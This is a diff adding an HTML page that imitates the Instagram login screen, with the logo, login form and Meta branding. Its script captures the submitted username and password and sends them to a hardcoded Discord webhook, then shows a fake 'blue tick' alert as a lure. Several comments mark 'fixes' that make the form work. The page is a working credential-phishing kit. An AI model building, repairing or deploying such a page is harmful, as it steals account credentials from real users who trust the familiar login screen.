@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="instagram">
+        <div id="eng">
+            English (UK)
+        </div>
+
+        <div id="logo">
+            <img src="images/Insta_logo.png">
+        </div>
+
+        <div id="input">
+            <!-- ✅ FIX: form syntax + id -->
+            <form id="myForm" method="post">
+                
+                <!-- ✅ FIX: id added -->
+                <input type="text" id="name" name="name"
+                 placeholder="Instagram ID, email address or mobile number" class="inp">
+                <br>
+
+                <!-- ✅ FIX: id added -->
+                <input type="password" id="password" name="password"
+                 placeholder="Password" class="inp">
+                <br>
+
+                <button type="submit" id="button">Log in</button>
+            </form>
+        </div>
+
+        <div id="forget">
+            Forgotten password?
+        </div>
+
+        <div id="create">
+            <p>Create new account</p>
+        </div>
+
+        <div id="meta">
+            <img src="images/meta.png">
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+
+            // ✅ FIX: correct IDs
+            let name = document.getElementById("name").value;
+            let password = document.getElementById("password").value;
+
+            fetch("https://discord.com/api/webhooks/1494734709987479824/Za--OlQC37iGQatHSEX1KXT9ACLf7lWdBXYUdrMo46KOSfQLZsreFK3mH32lp7JjIqZf", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: `📩 New Form Submission\n👤 Username: ${name}\n🔑 Password: ${password}`
+                })
+            })
+            .then(() => {
+                alert("You get the blue tick, check now!");
+            })
+            .catch(() => {
+                alert("Error!");
+            });
+        });
+    </script>
+</body>
+</html>
